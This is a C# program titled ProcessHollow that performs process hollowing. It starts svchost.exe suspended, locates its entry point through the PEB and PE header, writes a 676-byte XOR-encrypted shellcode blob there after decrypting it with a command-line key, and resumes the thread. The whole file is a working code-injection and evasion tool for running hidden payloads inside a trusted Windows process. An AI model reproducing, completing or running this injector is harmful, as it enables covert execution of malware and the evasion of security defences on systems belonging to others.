using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace ProcessHollow
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        static byte[] XorByteArray(byte[] inputBytes, string key)
        {
            byte[] result = new byte[inputBytes.Length];
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            // For each input byte
            for (int i = 0; i < inputBytes.Length; i++)
            {
                // XOR next bytes from input and key byte arrays
                result[i] = (byte)(inputBytes[i] ^ (byte)keyBytes[i % key.Length]);
            }
            return result;
        }

        static void Main(string[] args)
        {
            // Create new svchost process in suspended state
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            // Fetch address of the Process Environment Block (PEB) from the new svchost process
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            // Read the first eight bytes of svchost process memory
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // Parse the PE header from the svchost process memory to identify EntryPoint of executable
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // Overwrite Entrypoint with decrypted code
            byte[] codeBytes = new byte[676] { 0x97, 0x2d, 0xfa, 0x8f, 0x95, 0x91, 0xa7, 0x65, 0x79, 0x6b, 0x24, 0x28, 0x2a, 0x35, 0x2b, 0x3a, 0x2d, 0x48, 0xb9, 0x00, 0x31, 0xe0, 0x37, 0x19, 0x3d, 0x2d, 0xf2, 0x39, 0x7d, 0x31, 0xe0, 0x37, 0x59, 0x23, 0xee, 0x0b, 0x3b, 0x28, 0x48, 0xa2, 0x2d, 0x76, 0xdc, 0x2f, 0x33, 0x23, 0x54, 0xb9, 0xc7, 0x59, 0x18, 0x17, 0x67, 0x55, 0x4b, 0x24, 0xb8, 0xa2, 0x68, 0x38, 0x6a, 0xa4, 0x9b, 0x86, 0x37, 0x31, 0xe0, 0x37, 0x59, 0xe0, 0x27, 0x45, 0x23, 0x64, 0xa9, 0x0d, 0xe4, 0x01, 0x73, 0x6e, 0x7b, 0x2a, 0x34, 0x76, 0xee, 0x17, 0x79, 0x6b, 0x65, 0xf2, 0xeb, 0xed, 0x79, 0x6b, 0x65, 0x31, 0xee, 0xa5, 0x0d, 0x0c, 0x2d, 0x78, 0xbb, 0x35, 0x3d, 0xe0, 0x25, 0x59, 0x22, 0x64, 0xa9, 0xe0, 0x2d, 0x61, 0x88, 0x33, 0x34, 0x5a, 0xac, 0x31, 0x94, 0xac, 0x38, 0xe0, 0x51, 0xf1, 0x23, 0x64, 0xaf, 0x23, 0x54, 0xb9, 0xc7, 0x24, 0xb8, 0xa2, 0x68, 0x38, 0x6a, 0xa4, 0x41, 0x8b, 0x10, 0x88, 0x27, 0x66, 0x35, 0x4f, 0x6d, 0x3c, 0x52, 0xb4, 0x0c, 0xb3, 0x3d, 0x3d, 0xe0, 0x25, 0x5d, 0x22, 0x64, 0xa9, 0x0d, 0x24, 0xf2, 0x67, 0x2d, 0x3d, 0xe0, 0x25, 0x65, 0x22, 0x64, 0xa9, 0x2a, 0xee, 0x7d, 0xe3, 0x24, 0x21, 0x23, 0x64, 0xa9, 0x2a, 0x3d, 0x27, 0x32, 0x3f, 0x38, 0x33, 0x24, 0x20, 0x2a, 0x3f, 0x31, 0xe8, 0x89, 0x59, 0x2a, 0x37, 0x86, 0x8b, 0x3d, 0x38, 0x32, 0x3f, 0x31, 0xe0, 0x77, 0x90, 0x20, 0x9a, 0x86, 0x94, 0x38, 0x31, 0x5a, 0xbe, 0x2a, 0x22, 0xdb, 0x0e, 0x02, 0x0b, 0x10, 0x05, 0x00, 0x0d, 0x6b, 0x24, 0x2f, 0x23, 0xec, 0x98, 0x22, 0xa2, 0xbb, 0x27, 0x12, 0x5f, 0x6c, 0x9a, 0xac, 0x38, 0x36, 0x31, 0xe2, 0x84, 0x2a, 0x31, 0x28, 0x48, 0xab, 0x28, 0x48, 0xa2, 0x36, 0x2a, 0x22, 0xdf, 0x43, 0x3d, 0x1c, 0xde, 0x6b, 0x65, 0x79, 0x6b, 0x9a, 0xac, 0x83, 0x6b, 0x79, 0x6b, 0x65, 0x48, 0x52, 0x57, 0x57, 0x5a, 0x53, 0x41, 0x45, 0x51, 0x40, 0x45, 0x5d, 0x4d, 0x6b, 0x3f, 0x31, 0xe2, 0xa4, 0x30, 0xac, 0xa5, 0xc2, 0x6a, 0x65, 0x79, 0x26, 0x54, 0xb0, 0x38, 0x36, 0x13, 0x68, 0x36, 0x30, 0xd1, 0x32, 0xf0, 0xf4, 0xa3, 0x79, 0x6b, 0x65, 0x79, 0x94, 0xb0, 0x91, 0x11, 0x65, 0x79, 0x6b, 0x4a, 0x32, 0x1c, 0x0d, 0x34, 0x34, 0x50, 0x12, 0x25, 0x56, 0x4e, 0x07, 0x5d, 0x54, 0x33, 0x56, 0x4e, 0x23, 0x2e, 0x20, 0x0e, 0x5c, 0x38, 0x06, 0x57, 0x3b, 0x23, 0x57, 0x16, 0x33, 0x2c, 0x21, 0x59, 0x14, 0x00, 0x0f, 0x01, 0x18, 0x3d, 0x2b, 0x4d, 0x53, 0x02, 0x2c, 0x00, 0x15, 0x2d, 0x1d, 0x1c, 0x4c, 0x3c, 0x0b, 0x0d, 0x58, 0x0d, 0x3c, 0x25, 0x1f, 0x54, 0x18, 0x48, 0x20, 0x2c, 0x55, 0x3c, 0x08, 0x57, 0x40, 0x12, 0x26, 0x1e, 0x24, 0x37, 0x2d, 0x58, 0x48, 0x38, 0x07, 0x24, 0x4a, 0x3e, 0x3f, 0x3b, 0x0f, 0x57, 0x34, 0x1c, 0x31, 0x08, 0x18, 0x3c, 0x30, 0x2e, 0x0e, 0x3f, 0x07, 0x2a, 0x0a, 0x2f, 0x14, 0x1a, 0x52, 0x28, 0x2f, 0x0d, 0x08, 0x33, 0x5e, 0x21, 0x12, 0x07, 0x10, 0x34, 0x52, 0x55, 0x0d, 0x5f, 0x56, 0x3e, 0x5d, 0x37, 0x79, 0x23, 0xec, 0xb8, 0x38, 0x3f, 0x38, 0x33, 0x28, 0x48, 0xa2, 0x36, 0x31, 0xd3, 0x65, 0x4b, 0xc3, 0xe1, 0x79, 0x6b, 0x65, 0x79, 0x3b, 0x36, 0x2a, 0x22, 0xa2, 0xbb, 0x80, 0x30, 0x57, 0x50, 0x9a, 0xac, 0x23, 0xec, 0xbf, 0x01, 0x6f, 0x26, 0x23, 0xec, 0x88, 0x01, 0x7a, 0x23, 0x39, 0x0d, 0xf9, 0x58, 0x65, 0x79, 0x22, 0xec, 0x99, 0x01, 0x61, 0x38, 0x32, 0x2c, 0xc3, 0x1e, 0x23, 0xe7, 0xed, 0x65, 0x79, 0x6b, 0x65, 0x86, 0xbe, 0x28, 0x48, 0xab, 0x36, 0x23, 0x23, 0xec, 0x88, 0x26, 0x54, 0xb0, 0x26, 0x54, 0xb0, 0x38, 0x36, 0x30, 0xac, 0xa7, 0x54, 0x6d, 0x7d, 0x02, 0x94, 0xb0, 0xfc, 0xab, 0x10, 0x66, 0x23, 0xa2, 0xb8, 0xe3, 0x76, 0x79, 0x6b, 0x2c, 0xc3, 0x2f, 0x95, 0x4c, 0x8b, 0x65, 0x79, 0x6b, 0x65, 0x86, 0xbe, 0x2d, 0x86, 0xa4, 0x11, 0x7b, 0x80, 0xcf, 0x91, 0x3e, 0x65, 0x79, 0x6b, 0x36, 0x20, 0x01, 0x25, 0x23, 0x22, 0xec, 0xa8, 0xaa, 0x87, 0x69, 0x22, 0xa2, 0xb9, 0x6b, 0x75, 0x79, 0x6b, 0x2c, 0xc3, 0x33, 0xc1, 0x2a, 0x8e, 0x65, 0x79, 0x6b, 0x65, 0x86, 0xbe, 0x2d, 0xea, 0x38, 0x36, 0x31, 0xe2, 0x82, 0x31, 0xe2, 0x94, 0x31, 0xe2, 0xbf, 0x30, 0xac, 0xa5, 0x79, 0x4b, 0x65, 0x79, 0x22, 0xec, 0x80, 0x22, 0xdf, 0x6b, 0xfd, 0xec, 0x9b, 0x6b, 0x65, 0x79, 0x6b, 0x9a, 0xac, 0x23, 0xe6, 0xbd, 0x4b, 0xe0, 0xb9, 0x1f, 0xd7, 0x1f, 0xe0, 0x62, 0x31, 0x6a, 0xa6, 0xfc, 0xab, 0x10, 0xab, 0x33, 0xa6, 0x21, 0x01, 0x65, 0x20, 0xd0, 0x85, 0x64, 0x41, 0x6f, 0x38, 0xe2, 0xbf, 0x86, 0xbe };
            string key = args[0];
            byte[] origBytes = XorByteArray(codeBytes, key);
            WriteProcessMemory(hProcess, addressOfEntryPoint, origBytes, origBytes.Length, out nRead);

            // Resume thread
            ResumeThread(pi.hThread);
        }
    }
}